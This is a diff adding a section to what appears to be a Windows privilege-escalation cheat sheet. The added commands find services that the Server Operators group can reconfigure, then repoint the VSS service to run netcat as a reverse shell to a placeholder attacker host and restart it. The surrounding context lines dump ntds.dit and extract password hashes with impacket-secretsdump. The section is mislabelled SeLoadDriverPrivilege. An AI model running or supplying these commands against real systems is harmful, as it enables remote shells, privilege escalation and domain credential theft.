@@ -4070,6 +4070,19 @@ robocopy /b E:\Windows\ntds . ntds.dit
 impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
 ```
 
+###### SeLoadDriverPrivilege
+
+```c
+sc.exe query
+$services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
+```
+
+```c
+sc.exe config VSS binpath="C:\temp\nc64.exe -e cmd <LHOST> <LPORT>"
+sc.exe stop VSS
+sc.exe start VSS
+```
+
 ###### SeTakeOwnership Privilege
 
 ```c
